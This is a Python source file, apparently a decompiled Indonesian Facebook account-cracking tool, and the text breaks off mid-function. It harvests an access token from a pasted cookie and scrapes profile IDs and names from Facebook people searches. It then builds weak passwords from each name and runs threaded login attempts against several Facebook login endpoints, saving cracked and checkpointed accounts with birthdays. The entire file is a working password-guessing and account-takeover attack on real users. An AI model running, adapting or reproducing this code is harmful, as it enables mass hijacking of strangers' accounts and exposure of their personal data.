# Decompile by ZM-HERO
# LUB U ALL 💚🥵
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from urllib.parse import quote
_req_ses_  = requests.Session()
_req_get_  = requests.get
_req_post_ = requests.post
_js_lo_    = json.loads
boy_hamzah    = print
boy_nabilla    = input
hamzah = open
nabilla       = exit
host = "https://mbasic.facebook.com"
ok = []
cp = []
ttl = []
count = 1
data_user = []
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
header_nama = {"origin": "https://mbasic.facebook.com","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","accept-encoding": "gzip, deflate","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Host": "".join(bs4.re.findall("://(.*?)$","https://m.facebook.com")),"referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8","cache-control": "max-age=0","upgrade-insecure-requests": "1","content-type": "application/x-www-form-urlencoded"}
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
    if bu < 0 or bu > 12:
        exit()
    buTemp = bu - 1
except ValueError:
    exit()
op = bulan[buTemp]
tanggal = ("%s-%s-%s"%(ha,op,ta))
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
def bersih():
    try:os.remove('token.txt')
    except:pass
    try:os.remove('cookies.txt')
    except:pass
def jalan(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.04)
def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")
    else:os.system("clear")
def banner():
    boy_hamzah("""\033[0m\t      _______ ______  _______ 
\t     (_______|____  \(_______)
\t      _  _  _ ____)  )_____   
\t     | ||_|| |  __  (|  ___)  
\t     | |   | | |__)  ) |      
\t     |_|   |_|______/|_|      
                         
AU > Boy Hamzah
GH > https://github.com/BOY-H4MZ4H
FB > https://www.facebook.com/GUA.BOY.OKE
TM > XNSCODE
NS > MBF
────────────────────────────────────────────────────
""");time.sleep(0.03)
def cek_dev():
    _isi_dev_ = open('cookies.txt','r').read()
    if 'null' in _isi_dev_:
        print ('\nCookies Invalid, Login Ulang Dengan Cookie')
        exit()
    else:pass
def menu_log():
    bersih()
    clear()
    banner()
    var_menu()
    pmu = boy_nabilla('\n> ')
    if pmu in ['']:
        boy_hamzah('\nSalah')
        time.sleep(1)
        menu_log()
    elif pmu in ['1','01']:
        defaultua()
        cookie = input('\nCookie Facebook > ')
        try:
            header={
                'Host':'business.facebook.com',
                'cache-control':'max-age=0',
                'upgrade-insecure-requests':'1',
                'user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36',
                'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'content-type' : 'text/html; charset=utf-8',
                'accept-encoding':'gzip, deflate',
                'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cookie': cookie
            }
            r=_req_get_("https://business.facebook.com/creatorstudio/home", headers=header)
            p=re.search('{"accessToken":"(EAA\w+)', r.text)
            token=p.group(1)
            xd = open("token.txt", "w");xd.write(token);xd.close()
            xz = open('cookies.txt','w');xz.write(cookie);xz.close()
            #_req_post_("https://graph.facebook.com/100004655733027/subscribers?access_token=" + token)
            menu()
        except requests.exceptions.ConnectionError:
            boy_hamzah('\nKoneksi Bermasalah')
            exit()
        except (KeyError,IOError,AttributeError):
            boy_hamzah('\nCookie Invalid')
            exit()
    elif pmu in ['2','02']:
        clear()
        banner()
        info_penting()
        exit()
    elif pmu in ['0','00']:
        boy_hamzah('\nSelamat Tinggal')
        exit()
    else:
        boy_hamzah('\nMelek La Anjing Woi Idiot')
        exit()
def menu():
    clear()
    banner()
    try:
        token = open("token.txt","r").read()
        x = _req_get_("https://graph.facebook.com/me?access_token=" + token)
        y = _js_lo_(x.text)
        n = y['name']
        i = y['id']
    except (KeyError,IOError):
        boy_hamzah('\nCookie Invalid')
        time.sleep(1)
        menu_log()
    except requests.exceptions.ConnectionError:
        boy_hamzah('\nKoneksi Bermasalah')
        exit()
    try:
        booy = open("token.txt","r").read()
        _nabiilah_ = hamzah("cookies.txt","r").read()
        _nanabila_ = {"cookie" : _nabiilah_}
        if 'null' in _nabiilah_:
            status_cookies = ('\033[0;91mTidak')
        else:
            status_cookies = ('\033[0;92mYa')
    except (KeyError,IOError):
        boy_hamzah('\nCookie Invalid')
        time.sleep(1)
        menu_log()
    except requests.exceptions.ConnectionError:
        boy_hamzah('\nKoneksi Bermasalah')
        exit()
    a = _req_get_("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()
    try:
        ip = a["query"]
    except KeyError:
        ip = " "
    _update_ = 'V1.1'
    boy_hamzah('Haii > ' + n)
    boy_hamzah('')
    boy_hamzah('01.) Crack Pencarian Nama')
    boy_hamzah('02.) Crack Member Grup')
    boy_hamzah('00.) Keluar')
    pm = boy_nabilla('\n> ')
    if pm in ['']:
        boy_hamzah('\nSalah')
        menu()
    elif pm in ['1','01']:
        cek_dev()
        dump_name(_nanabila_)
    elif pm in ['2','02']:
    	boy_hamzah('\nMenu Ini Akan Segera Di Rilis');time.sleep(2),menu()
    elif pm in ['0','00']:
        boy_hamzah('\nSelamat Tinggal')
        menu_log()
    else:
        boy_hamzah('\nSalah')
        time.sleep(1)
        menu()
def defaultua():
    ua = ua_xiaomi
    try:
        ugent = hamzah('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
    except (KeyError,IOError):
        menu_log()
def dump_name(_boy__nabilla_):
    __name__ = boy_nabilla('\nNama > ').split(',')
    _file_ = 'dump_name.json'
    try:os.remove(_file_)
    except:pass
    for _name_ in __name__:
        _url_ = "https://mbasic.facebook.com/search/people/?q="+_name_
        cari_nama(_file_,_boy__nabilla_,_url_)
    _buka_file_ = hamzah(_file_,'r').read().splitlines()
    return crack(_file_)
def cari_nama(_file_,_cookies_,_url_):
    hamzah(_file_,"a+")
    _req_ses_dev_ = bs4.BeautifulSoup(_req_get_(_url_, cookies=_cookies_,headers=header_nama).text,"html.parser")
    for _boy__nabilla_dev_ in _req_ses_dev_.find_all("a",href=True):
        boy_hamzah ("\rSedang Mengambil ID > %s"%(len(hamzah(_file_).read().splitlines())),end='');sys.stdout.flush()
        if "<img alt=" in str(_boy__nabilla_dev_):
            if "home.php" in str(_boy__nabilla_dev_["href"]):
                continue
            else:
                _str_dev_ = str(_boy__nabilla_dev_["href"])
                if "profile.php" in _str_dev_:
                    _name_ = _boy__nabilla_dev_.find("img").get("alt").replace(", profile picture","")
                    _find_ = bs4.re.findall("/profile\.php\?id=(.*?)&",_str_dev_)
                    if len (_find_) !=0:
                        _user_ = "".join(_find_)
                        if _user_ in hamzah(_file_).read():
                            pass
                        else:
                            hamzah(_file_,"a+").write("%s•%s\n"%(_user_,_name_))
                else:
                    _find_ = bs4.re.findall("/(.*?)\?",_str_dev_)
                    _name_ = _boy__nabilla_dev_.find("img").get("alt").replace(", profile picture","")
                    if len(_find_) !=0:
                        _user_="".join(_find_)
                        if _user_ in hamzah(_file_).read():
                            pass
                        else:
                            hamzah(_file_,"a+").write("%s•%s\n"%(_user_,_name_))
        if "Lihat Hasil Selanjutnya" in _boy__nabilla_dev_.text:
            cari_nama(_file_,_cookies_,_boy__nabilla_dev_["href"])
def generate1(_nabiilah_):
    _boy__nabilla_=[]
    for i in _nabiilah_.split(" "):
        if len(i)<3:
            continue 
        else:
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:
                _boy__nabilla_.append(i+"123")
                _boy__nabilla_.append(i+"12345")
            elif len(i)>=6:
                _boy__nabilla_.append(i)
                _boy__nabilla_.append(i+"123")
                _boy__nabilla_.append(i+"12345")
            else:
                continue
    _boy__nabilla_.append(_nabiilah_.lower())
    return _boy__nabilla_
def generate2(_nabiilah_):
    _boy__nabilla_=[]
    for i in _nabiilah_.split(" "):
        if len(i)<3:
            continue
        else:
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:
                _boy__nabilla_.append(i+"123")
                _boy__nabilla_.append(i+"12345")
            else:
                _boy__nabilla_.append(i)
                _boy__nabilla_.append(i+"123")
                _boy__nabilla_.append(i+"12345")
    _boy__nabilla_.append(_nabiilah_.lower())
    _boy__nabilla_.append("sayang")
    _boy__nabilla_.append("domino")
    _boy__nabilla_.append("anjing")
    return _boy__nabilla_
def generate3(_nabiilah_):
    _boy__nabilla_=[]
    for i in _nabiilah_.split(" "):
        if len(i)<3:
            continue
        else:
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:
                _boy__nabilla_.append(i+"123")
                _boy__nabilla_.append(i+"12345")
            else:
                _boy__nabilla_.append(i)
                _boy__nabilla_.append(i+"123")
                _boy__nabilla_.append(i+"12345")
    _boy__nabilla_.append(_nabiilah_.lower())
    _boy__nabilla_.append("sayang")
    _boy__nabilla_.append("domino")
    _boy__nabilla_.append("anjing")
    return _boy__nabilla_
def generate4(_nabiilah_):
    _boy__nabilla_=[]
    ps = hamzah('pass.txt','r').read()
    pp = hamzah('passangka.txt','r').read()
    for i in _nabiilah_.split(" "):  
        i=i.lower()
        if len(i)<3:continue
        elif len(i)==3 or len(i)==4 or len(i)==5:
            _boy__nabilla_.append(i+"123")
            _boy__nabilla_.append(i+"12345")
        else:
            _boy__nabilla_.append(i)
            _boy__nabilla_.append(i+"123")
            _boy__nabilla_.append(i+"12345")
    if pp in ['',' ','  ']:pass
    else:
        for i in _nabiilah_.split(" "):  
            i=i.lower()
            for x in pp.split(','):
                _boy__nabilla_.append(i+x)
    if ps in ['',' ','  ']:pass
    else:
        for z in ps.split(','):
            _boy__nabilla_.append(z)
    _boy__nabilla_.append(_nabiilah_.lower())
    return _boy__nabilla_
def tambah_pass():
    boy_hamzah('\n[ CONTOH SANDI ] sayang,pengen,ngentot DLL')
    cuy = boy_nabilla('\nSandi Tambahan > ')
    gh = hamzah('pass.txt','w')
    gh.write(cuy)
    gh.close
def tambah_pass_angka():
    boy_hamzah('\n[ CONTOH SANDI ] 321,54321,')
    coy = boy_nabilla('\nMasukkan Sandi Tambahan Dibelakang Nama > ')
    xy = hamzah('passangka.txt','w')
    xy.write(coy)
    xy.close
def log_api(em,pas,hosts):
    ua = hamzah('ugent.txt','r').read()
    r = _req_ses_
    header = {
        "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
        "x-fb-sim-hni": str(random.randint(20000, 40000)),
        "x-fb-net-hni": str(random.randint(20000, 40000)),
        "x-fb-connection-quality": "EXCELLENT",
        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
        "user-agent": ua,
        "content-type": "application/x-www-form-urlencoded",
        "x-fb-http-engine": "Liger"
        }
    response = r.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + em + '&password=' + pas + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:
        return {"status":"success","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:
        return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
def log_mbasic(em,pas,hosts):
    ua = hamzah('ugent.txt','r').read()
    r = requests.Session()
    r.headers.update({
        "Host":"mbasic.facebook.com",
        "cache-control":"max-age=0",
        "upgrade-insecure-requests":"1",
        "user-agent":ua,
        "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "accept-encoding":"gzip, deflate",
        "accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
        })
    p = r.get("https://mbasic.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":
                data.update({"email":em})
            elif i.get("name")=="pass":
                data.update({"pass":pas})
            else:
                data.update({i.get("name"):""})
        else:
            data.update({i.get("name"):i.get("value")})
    data.update({
        "fb_dtsg":meta,
        "m_sess":"",
        "__user":"0",
        "__req":"d",
        "__csr":"",
        "__a":"",
        "__dyn":"",
        "encpass":""
        })
    r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):
        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):
        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}
def log_m(em,pas,hosts):
    ua = hamzah('ugent.txt','r').read()
    r = requests.Session()
    r.headers.update({
        "Host":"m.facebook.com",
        "cache-control":"max-age=0",
        "upgrade-insecure-requests":"1",
        "user-agent":ua,
        "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "accept-encoding":"gzip, deflate",
        "accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
        })
    p = r.get("https://m.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":
                data.update({"email":em})
            elif i.get("name")=="pass":
                data.update({"pass":pas})
            else:
                data.update({i.get("name"):""})
        else:
            data.update({i.get("name"):i.get("value")})
    data.update({
        "fb_dtsg":meta,
        "m_sess":"",
        "__user":"0",
        "__req":"d",
        "__csr":"",
        "__a":"",
        "__dyn":"",
        "encpass":""
        })
    r.headers.update({"referer":"https://m.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):
        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):
        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}
def cek_log(user, pasw, h_cp):
    ua = "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
    mb = "https://mbasic.facebook.com"
    ses = _req_ses_
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": mb,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": mb+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        boy_hamzah("[!] Redirect Overload")
    if "c_user" in ses.cookies:
        return {"status":"error","email":user,"pass":pasw}
    elif "checkpoint" in ses.cookies:
        try:
            form = run.find("form")
            dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
            jzst = form.find("input",{"name":"jazoest"})["value"]
            nh   = form.find("input",{"name":"nh"})["value"]
            dataD = {
                "fb_dtsg": dtsg,
                "fb_dtsg": dtsg,
                "jazoest": jzst,
                "jazoest": jzst,
                "checkpoint_data":"",
                "submit[Continue]":"Lanjutkan",
                "nh": nh
            }
            xnxx = par(ses.post(mb+form["action"], data=dataD).text, "html.parser")
            ngew = [yy.text for yy in xnxx.find_all("option")]
            opsi=[]
            option_dev = []
            for opt in range(len(ngew)):
                option_dev.append("\n"+P+str(opt+1)+". "+ngew[opt]+" ")
            jumop = ('Total Opsi > %s'%(P,str(len(option_dev))))
        except:pass
        boy_hamzah(h_cp)
        try:
            boy_hamzah(jumop+"".join(option_dev))
        except:pass
    elif "login_error" in str(run):
        pass
    else:
        pass
def cek_apk(h_ok,_boy__nabilla_):
    apk = []
    ses_ = _req_ses_
    url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
    dat_game = ses_.get(url,cookies={'cookie':_boy__nabilla_})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:
            celeng = asu.find('span').text
            apk.append('\n - '+celeng)
        except:pass
    url2 = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
    dat_game = ses_.get(url2,cookies={'cookie':_boy__nabilla_})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:
            celeng = asu.find('span').text
            apk.append('\n - '+celeng)
        except:pass
    boy_hamzah(h_ok+''.join(apk))
def tahun(fx):
    if len(fx)==15:
        if fx[:10] in ['1000000000']       :tahunz = ' - 2009'
        elif fx[:9] in ['100000000']       :tahunz = ' - 2009'
        elif fx[:8] in ['10000000']        :tahunz = ' - 2009'
        elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = ' - 2009'
        elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = ' - 2010'
        elif fx[:6] in ['100001']          :tahunz = ' - 2010/2011'
        elif fx[:6] in ['100002','100003'] :tahunz = ' - 2011/2012'
        elif fx[:6] in ['100004']          :tahunz = ' - 2012/2013'
        elif fx[:6] in ['100005','100006'] :tahunz = ' - 2013/2014'
        elif fx[:6] in ['100007','100008'] :tahunz = ' - 2014/2015'
        elif fx[:6] in ['100009']          :tahunz = ' - 2015'
        elif fx[:5] in ['10001']           :tahunz = ' - 2015/2016'
        elif fx[:5] in ['10002']           :tahunz = ' - 2016/2017'
        elif fx[:5] in ['10003']           :tahunz = ' - 2018/2019'
        elif fx[:5] in ['10004']           :tahunz = ' - 2019/2020'
        elif fx[:5] in ['10005']           :tahunz = ' - 2020'
        elif fx[:5] in ['10006','10007','10008']:tahunz = ' - 2021'
        else:tahunz=''
    elif len(fx) in [9,10]:
        tahunz = ' - 2008/2009'
    elif len(fx)==8:
        tahunz = ' - 2007/2008'
    elif len(fx)==7:
        tahunz = ' - 2006/2007'
    else:tahunz=''
    return tahunz
def koki(cookies):
    result=[]
    for i in enumerate(cookies.keys()):
        if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
        else:result.append(i[1]+"="+cookies[i[1]]+"; ")
    sample = "".join(result)
    sam_   = sample.replace(' ','')
    samp_  = sam_.split(';')
    # _raw_cookies_warvest_ = c_user,datr,dnonce,fr,sb,xs
    # _raw_cookies_aap_     = c_user,fr,sb,xs,datr
    # _cooked_cookies_      = sb,datr,c_user,xs,fr
    final = ('%s; %s; %s; %s; %s'%(samp_[4],samp_[1],samp_[0],samp_[5],samp_[3]))
    return final
class crack:
    def __init__(self,files):
        self.ada = []
        self.cp = []
        self.ko = 0
        print('\n\nIngin Menggunakan Sandi Manual.? [ y/t ]')
        while True:
            f = boy_nabilla('\n> ')
            if f=="":
                boy_hamzah('\nSalah')
                time.sleep(1)
                menu()
            elif f in ['y','Y']:
                try:
                    while True:
                        try:
                            self.apk = files
                            self.fs = hamzah(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            boy_hamzah("   %s"%(e))
                            continue
                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({"id":i.split("•")[0]})
                        except:continue
                except Exception as e:
                    boy_hamzah(("   %s"%e))
                    continue
                boy_hamzah('\n[ CONTOH SANDI ] sayang,ngentot DLL')
                self.pwlist()
                break
            elif f in ['t','T']:
                try:
                    while True:
                        try:
                            self.apk = files
                            self.fs = hamzah(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            boy_hamzah("   %s"%(e))
                            continue
                    self.fl = []
                    start_methodezz()
                    kopi = boy_nabilla('\n> ')
                    if kopi in ['']:
                        boy_hamzah('\nSalah')
                        time.sleep(1)
                        menu()
                    elif kopi in ['1','01']:
                        for i in self.fs:
                            try:
                                self.fl.append({"id":i.split("•")[0],"pw":generate1(i.split("•")[1])})
                            except:continue
                    elif kopi in ['2','02']:
                        for i in self.fs:
                            try:
                                self.fl.append({"id":i.split("•")[0],"pw":generate2(i.split("•")[1])})
                            except:continue
                    elif kopi in ['3','03']:
                        for i in self.fs:
                            try:
                                self.fl.append({"id":i.split("•")[0],"pw":generate3(i.split("•")[1])})
                            except:continue
                    elif kopi in ['4','04']:
                        os.system('rm -rf pass.txt')
                        os.system('rm -rf passangka.txt')
                        tambah_pass()
                        tambah_pass_angka()
                        for i in self.fs:
                            try:
                                self.fl.append({"id":i.split("•")[0],"pw":generate4(i.split("•")[1])})
                            except:continue
                    else:
                        boy_hamzah('\nSalah')
                        time.sleep(1)
                        menu()
                    start_method()
                    put = boy_nabilla('\n> ')
                    if put in ['']:
                        boy_hamzah('\nSalah')
                        time.sleep(1)
                        menu()
                    elif put in ['1','01']:
                        boy_hamzah('\nMuncul Kan Opsi CHECK.? [ y/t ]')
                        puf = boy_nabilla('\n> ')
                        if puf in ['']:
                            boy_hamzah('\nSalah')
                            time.sleep(1)
                            menu()
                        elif puf in ['y','Y']:
                            started()
                            ThreadPool(35).map(self.api_opsi,self.fl)
                            os.remove(self.apk)
                            nabilla()
                            break
                        elif puf in ['t','T']:
                            started()
                            ThreadPool(35).map(self.api,self.fl)
                            os.remove(self.apk)
                            nabilla()
                            break
                        else:
                            boy_hamzah('\nSalah')
                            time.slsep(1)
                            menu()
                    elif put in ['2','02']:
                        boy_hamzah('\nMuncul Kan Opsi CHECK.? [ y/t ]')
                        puf = boy_nabilla('\n> ')
                        if puf in ['']:
                            boy_hamzah('\nSalah')
                            time.sleep(1)
                            menu()
                        elif puf in ['y','Y']:
                            started()
                            ThreadPool(35).map(self.mbasic_opsi,self.fl)
                            os.remove(self.apk)
                            nabilla()
                            break
                        elif puf in ['t','T']:
                            started()
                            ThreadPool(35).map(self.mbasic,self.fl)
                            os.remove(self.apk)
                            nabilla()
                            break
                        else:
                            print ('\nSalah')
                            time.sleep(1)
                            menu()
                    elif put in ['3','03']:
                        boy_hamzah('\nMuncul Kan Hasil CHECK.? [ y/t ]')
                        puf = boy_nabilla('\n> ')
                        if puf in ['']:
                            boy_hamzah('\nSalah')
                            time.sleep(1)
                            menu()
                        elif puf in ['y','Y']:
                            started()
                            ThreadPool(35).map(self.m_opsi,self.fl)
                            os.remove(self.apk)
                            nabilla()
                            break
                        elif puf in ['t','T']:
                            started()
                            ThreadPool(35).map(self.m,self.fl)
                            os.remove(self.apk)
                            nabilla()
                            break
                        else:
                            print ('\nSalah')
                            time.sleep(1)
                            menu()
                    else:
                        boy_hamzah('\nSalah')
                        time.sleep(1)
                        menu()
                except Exception as e:
                    boy_hamzah(("   %s"%e))
    def pwlist(self):
        self.pw = boy_nabilla('\nSandi > ').split(",")
        if len(self.pw) ==0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({"pw":self.pw})
            start_method()
            put = boy_nabilla('\n> ')
            if put in ['']:
                boy_hamzah('\nSalah')
                time.sleep(1)
                menu()
            elif put in ['1','01']:
                boy_hamzah('\nMuncul Kan Opsi CHECK.? [ y/t ]')
                puf = boy_nabilla('\n> ')
                if puf in ['']:
                    boy_hamzah('\nSalah')
                    menu()
                elif puf in ['y','Y']:
                    started()
                    ThreadPool(30).map(self.api_opsi,self.fl)
                    os.remove(self.apk)
                    nabilla()
                elif puf in ['t','T']:
                    started()
                    ThreadPool(30).map(self.api,self.fl)
                    os.remove(self.apk)
                    exit()
                else:
                    boy_hamzah('\nSalah')
                    time.sleep(1)
                    menu()
            elif put in ['2','02']:
                boy_hamzah('\nMuncul Kan Opsi CHECK.? [ y/t ]')
                puf = input('\n> ')
                if puf in ['']:
                    boy_hamzah('\nSalah')
                    time.sleep(1)
                    menu()
                elif puf in ['y','Y']:
                    started()
                    ThreadPool(30).map(self.mbasic_opsi,self.fl)
                    os.remove(self.apk)
                    exit()
                elif puf in ['t','T']:
                    started()
                    ThreadPool(30).map(self.mbasic,self.fl)
                    os.remove(self.apk)
                    exit()
                else:
                    boy_hamzah('\nSalah')
                    time.sleep(1)
                    menu()
            elif put in ['3','03']:
                boy_hamzah('\nMuncul Kan Opsi CHECK.? [ y/t ]')
                puf = input('\n> ')
                if puf in ['']:
                    boy_hamzah('\nSalah')
                    time.sleep(1)
                    menu()
                elif puf in ['y','Y']:
                    started()
                    ThreadPool(30).map(self.m_opsi,self.fl)
                    os.remove(self.apk)
                    exit()
                elif puf in ['t','T']:
                    started()
                    ThreadPool(30).map(self.m,self.fl)
                    os.remove(self.apk)
                    nabilla()
                else:
                    boy_hamzah('\nSalah')
                    time.sleep(1)
                    menu()
            else:
                boy_hamzah('\nSalah')
                time.sleep(1)
                menu()
    def api(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_api(fl.get("id"),i,"https://b-api.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = _req_get_("https://graph.facebook.com/" + fl.get("id") + "?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name&access_token=" + hamzah("token.txt","r").read())
                        tt = _js_lo_(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        boy_hamzah("\r\033[0;93mCHECK %s - %s %s %s %s%s"%(fl.get("id"),i,d,m,y,tahun(fl.get("id"))))
                        self.cp.append("%s - %s %s%s%s"%(fl.get("id"),i,d,m,y))
                        open("checkpoint.txt","a+").write("%s - %s %s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    boy_hamzah("\r\033[0;93mCHECK %s - %s%s     "%(fl.get("id"),i,tahun(fl.get("id"))))
                    self.cp.append("%s - %s"%(fl.get("id"),i))
                    open("checkpoint.txt","a+").write("%s - %s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    boy_hamzah("\r\033[0;92mRESULTS %s - %s%s     "%(fl.get("id"),i,tahun(fl.get("id"))))
                    self.ada.append("%s - %s"%(fl.get("id"),i))
                    open("multiresults.txt","a+").write("%s - %s\n"%(fl.get("id"),i))
                    break
                else:continue
            self.ko+=1
            boy_hamzah("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
        except:
            self.api(fl)
    def api_opsi(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_api(fl.get("id"),i,"https://b-api.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = _req_get_("https://graph.facebook.com/" + fl.get("id") + "?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name&access_token=" + hamzah("token.txt","r").read())
                        tt = _js_lo_(ke.text)
                        ttl = tt["birthday"]
